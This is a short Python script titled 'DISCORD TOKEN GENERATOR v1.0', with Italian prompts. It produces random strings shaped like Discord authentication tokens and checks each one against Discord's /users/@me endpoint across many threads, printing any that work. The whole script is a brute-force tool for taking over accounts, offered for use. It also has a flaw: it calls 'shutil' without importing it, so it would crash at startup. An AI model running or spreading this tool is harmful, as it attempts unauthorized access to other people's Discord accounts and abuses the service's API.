import time
import random
import string
import threading
import requests
import os

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def center(text):
    width = shutil.get_terminal_size().columns
    return text.center(width)

def header():
    clear()
    print("\033[92m")
    print(center("╔══════════════════════════════════════════════════════╗"))
    print(center("║              DISCORD TOKEN GENERATOR v1.0            ║"))
    print(center("╚══════════════════════════════════════════════════════╝"))
    print("\033[0m\n")

def main():
    header()
    try:
        threads_number = int(input("🔢 Quanti thread vuoi avviare? > "))
    except:
        print("❌ Inserisci un numero valido.")
        input("\nPremi Invio per chiudere...")
        return

    def token_check():
        first = ''.join(random.choices(string.ascii_letters + string.digits + '-' + '_', k=random.choice([24, 26])))
        second = ''.join(random.choices(string.ascii_letters + string.digits + '-' + '_', k=6))
        third = ''.join(random.choices(string.ascii_letters + string.digits + '-' + '_', k=38))
        token = f"{first}.{second}.{third}"

        try:
            response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token})
            if response.status_code == 200 and "username" in response.text:
                print(f"✅ Valid Token: {token}")
            else:
                print(f"❌ Invalid Token: {token}")
        except:
            print(f"⚠️ Errore durante il check: {token}")

    def request():
        threads = []
        for _ in range(threads_number):
            t = threading.Thread(target=token_check)
            t.start()
            threads.append(t)
        for thread in threads:
            thread.join()

    request()
    input("\nPremi Invio per chiudere...")

if __name__ == "__main__":
    main()
